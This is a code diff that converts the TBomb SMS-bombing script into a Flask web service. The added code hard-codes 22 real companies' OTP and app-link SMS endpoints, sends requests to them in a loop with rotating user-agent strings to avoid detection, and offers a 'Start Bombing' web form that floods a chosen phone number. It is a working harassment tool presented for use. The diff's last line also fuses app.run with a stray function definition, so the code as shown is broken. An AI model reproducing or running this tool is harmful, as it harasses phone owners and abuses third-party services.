@@ -3,114 +3,152 @@ import time
 import requests
 import threading
 import random
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
-active_tasks = {}
 
-# List of User Agents taaki har baar naya browser lage
+# List of User Agents
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
 ]
 
-def check_intr():
-    try:
-        requests.get("https://motherfuckingwebsite.com")
-    except Exception:
-        bann_text()
-        mesgdcrt.FailureMessage("Poor internet connection detected")
-        sys.exit(2)
+# Dictionary of all 22 APIs you provided
+SMS_APIS = [
+    {"url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={target}", "method": "GET"},
+    {"url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={target}", "method": "GET"},
+    {"url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "method": "POST", "data": {"mobileoremail": "{target}"}},
+    {"url": "https://www.frotels.com/appsendsms.php", "method": "POST", "data": {"mobno": "{target}"}},
+    {"url": "https://www.gapoon.com/userSignup", "method": "POST", "data": {"mobile": "{target}"}},
+    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data": {"phone": "{target}"}},
+    {"url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "data": {"phone": "{target}"}},
+    {"url": "https://cityflo.com/website-app-download-link-sms/", "method": "POST", "data": {"mobile_number": "{target}"}},
+    {"url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "data": {"mobileNumber": "{target}"}},
+    {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": "{target}"}},
+    {"url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{target}", "method": "GET"},
+    {"url": "https://unacademy.com/api/v1/user/get_app_link/", "method": "POST", "data": {"phone": "{target}"}},
+    {"url": "https://www.treebo.com/api/v2/auth/login/otp/", "method": "POST", "data": {"phone_number": "{target}"}},
+    {"url": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={target}", "method": "GET"},
+    {"url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"contactNumber": "{target}"}},
+    {"url": "https://www.mylescars.com/usermanagements/chkContact", "method": "POST", "data": {"contactNo": "{target}"}},
+    {"url": "https://grofers.com/v2/accounts/", "method": "POST", "data": {"user_phone": "{target}"}},
+    {"url": "https://api.dream11.com/sendsmslink", "method": "POST", "data": {"mobileNum": "{target}"}},
+    {"url": "https://www.cashify.in/api/cu01/v1/app-link?mn={target}", "method": "GET"},
+    {"url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "data": {"phone": "{target}"}},
+    {"url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "data": {"phoneNumber": "{target}"}},
+    {"url": "https://indialends.com/internal/a/mobile-verification_v2.ashx", "method": "POST", "data": {"jfsdfu14hkgertd": "{target}"}}
+]
 
+# Store active tasks status
+status_db = {"success": 0, "failed": 0, "running": False}
 
-def format_phone(num):
-    num = [n for n in num if n in string.digits]
-    return ''.join(num).strip()
-
-
-def do_zip_update():
-    success = False
-    if DEBUG_MODE:
-        zip_url = "https://github.com/TheSpeedX/TBomb/archive/dev.zip"
-        dir_name = "TBomb-dev"
-    else:
-        zip_url = "https://github.com/TheSpeedX/TBomb/archive/master.zip"
-        dir_name = "TBomb-master"
-    print(ALL_COLORS[0]+"Downloading ZIP ... "+RESET_ALL)
-    response = requests.get(zip_url)
-    if response.status_code == 200:
-        zip_content = response.content
+def bomb_worker(target, count, delay):
+    global status_db
+    status_db["success"] = 0
+    status_db["failed"] = 0
+    status_db["running"] = True
+    
+    for i in range(count):
+        if not status_db["running"]: break
+        
+        api = random.choice(SMS_APIS)
+        headers = {'User-Agent': random.choice(USER_AGENTS)}
+        
         try:
-            with zipfile.ZipFile(BytesIO(zip_content)) as zip_file:
-                for member in zip_file.namelist():
-                    filename = os.path.split(member)
-                    if not filename[1]:
-                        continue
-                    new_filename = os.path.join(
-                        filename[0].replace(dir_name, "."),
-                        filename[1])
-                    source = zip_file.open(member)
-                    target = open(new_filename, "wb")
-                    with source, target:
-                        shutil.copyfileobj(source, target)
-            success = True
-        except Exception:
-            mesgdcrt.FailureMessage("Error occured while extracting !!")
-    if success:
-        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
-        mesgdcrt.GeneralMessage(
-            "Please run the script again to load the latest version")
-    else:
-        mesgdcrt.FailureMessage("Unable to update TBomb.")
-        mesgdcrt.WarningMessage(
-            "Grab The Latest one From https://github.com/TheSpeedX/TBomb.git")
+            url = api["url"].format(target=target)
+            if api["method"] == "GET":
+                response = requests.get(url, headers=headers, timeout=10)
+            else:
+                payload = {k: v.format(target=target) for k, v in api["data"].items()}
+                response = requests.post(url, data=payload, headers=headers, timeout=10)
+            
+            if response.status_code == 200:
+                status_db["success"] += 1
+            else:
+                status_db["failed"] += 1
+        except:
+            status_db["failed"] += 1
+        
+        time.sleep(delay)
+    
+    status_db["running"] = False
 
-    sys.exit()
+# Web Interface (HTML)
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TBomb Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 20px; }
+        input, button { padding: 10px; margin: 5px; width: 80%; max-width: 300px; border-radius: 5px; border: none; }
+        button { background: #28a745; color: white; cursor: pointer; font-weight: bold; }
+        .status { margin-top: 20px; padding: 15px; border: 1px solid #444; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h1>TBomb Online</h1>
+    <input type="text" id="phone" placeholder="Enter Mobile (without +91)">
+    <input type="number" id="count" placeholder="Number of SMS (Max 100)">
+    <input type="number" id="delay" placeholder="Delay in seconds (e.g. 1)" step="0.1">
+    <br>
+    <button onclick="startBombing()">Start Bombing</button>
+    <button style="background:red;" onclick="stopBombing()">Stop</button>
 
+    <div class="status">
+        <p>Status: <span id="run_status">Idle</span></p>
+        <p>Successful: <span id="sc">0</span></p>
+        <p>Failed: <span id="fl">0</span></p>
+    </div>
 
-def do_git_update():
-    success = False
-    try:
-        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL, end='')
-        process = subprocess.Popen("git checkout . && git pull ",
-                                   shell=True,
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.STDOUT)
-        while process:
-            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
-            time.sleep(1)
-            returncode = process.poll()
-            if returncode is not None:
-                break
-        success = not process.returncode
-    except Exception:
-        success = False
-    print("\n")
+    <script>
+        function startBombing() {
+            const phone = document.getElementById('phone').value;
+            const count = document.getElementById('count').value;
+            const delay = document.getElementById('delay').value;
+            fetch(`/start?target=${phone}&count=${count}&delay=${delay}`);
+        }
+        function stopBombing() { fetch('/stop'); }
+        
+        setInterval(() => {
+            fetch('/status').then(r => r.json()).then(data => {
+                document.getElementById('sc').innerText = data.success;
+                document.getElementById('fl').innerText = data.failed;
+                document.getElementById('run_status').innerText = data.running ? "Running..." : "Stopped";
+            });
+        }, 1000);
+    </script>
+</body>
+</html>
+"""
 
-    if success:
-        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
-        mesgdcrt.GeneralMessage(
-            "Please run the script again to load the latest version")
-    else:
-        mesgdcrt.FailureMessage("Unable to update TBomb.")
-        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
-        mesgdcrt.GeneralMessage("Then run command:")
-        print(
-            "git checkout . && "
-            "git pull https://github.com/TheSpeedX/TBomb.git HEAD")
-    sys.exit()
+@app.route('/')
+def home():
+    return render_template_string(HTML_TEMPLATE)
 
+@app.route('/start')
+def start():
+    target = request.args.get('target')
+    count = int(request.args.get('count', 10))
+    delay = float(request.args.get('delay', 1))
+    if not status_db["running"]:
+        threading.Thread(target=bomb_worker, args=(target, count, delay)).start()
+        return jsonify({"msg": "Started"})
+    return jsonify({"msg": "Already running"})
 
-def update():
-    if shutil.which('git'):
-        do_git_update()
-    else:
-        do_zip_update()
+@app.route('/status')
+def status():
+    return jsonify(status_db)
 
+@app.route('/stop')
+def stop():
+    status_db["running"] = False
+    return jsonify({"msg": "Stopped"})
 
-def check_for_updates():
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))def check_for_updates():
     if DEBUG_MODE:
         mesgdcrt.WarningMessage(
             "DEBUG MODE Enabled! Auto-Update check is disabled.")
